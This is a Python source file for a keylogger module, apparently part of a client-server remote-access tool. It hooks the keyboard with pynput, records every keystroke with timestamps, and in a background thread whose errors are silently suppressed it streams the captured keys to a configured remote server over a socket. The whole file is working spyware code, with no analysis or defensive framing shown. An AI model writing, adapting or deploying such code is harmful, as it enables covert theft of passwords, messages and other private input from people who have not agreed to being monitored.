'''
    Creates a connection to the server, sending the
    keystrokes pressed, with attached timestamps in
    intervals.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * pynput
'''

from client.modules.module import Module
from shared.helper import Helper
from shared.state import Static
from shared.error import Error
from shared.data import Data

import socket
import pynput
import time
import re


class Keylogger(Module):

    __INTERVAL = Static.LIVE_TIMEOUT / 2

    def __init__(self, token):
        super().__init__(token)
        self.__listener = pynput.keyboard.Listener(
            on_press=self.__press)
        self.__listener.start()
        self.__first = True
        self.__keys = ''

    def __press(self, key):
        key = str(key)

        if key == 'Key.enter':
            key = f'\n{Helper.timestamp()}:'
        else:
            if key == 'Key.space':
                key = ' '
            elif key.startswith('Key.'):
                key = key[4:]
            else:
                if re.search(r'^\[.*]$', key):
                    key = key[1:-1]

                if re.search('^\'.*\'$', key):
                    key = key[1:-1]
                elif re.search('^".*"$', key):
                    key = key[1:-1]
                elif re.search('^<.*>$', key):
                    key = key[1:-1]

            if len(key) > 1:
                key = f'[{key.upper()}]'

        if self.__first:
            self.__first = False
            key = f'{Helper.timestamp()}:{key}'

        self.__keys += key

    @Error.quiet_thread
    def __send(self):
        try:
            with socket.create_connection(
                    (Static.IP, Static.PORT)) as sock:
                Data.send(sock, self.token)
                Data.recv(sock)

                while True:
                    keys, self.__keys = self.__keys, ''
                    Data.send(sock, keys)
                    Data.recv(sock)
                    time.sleep(Keylogger.__INTERVAL)
        finally:
            self.__listener.stop()

    def live(self):
        Helper.thread(self.__send)
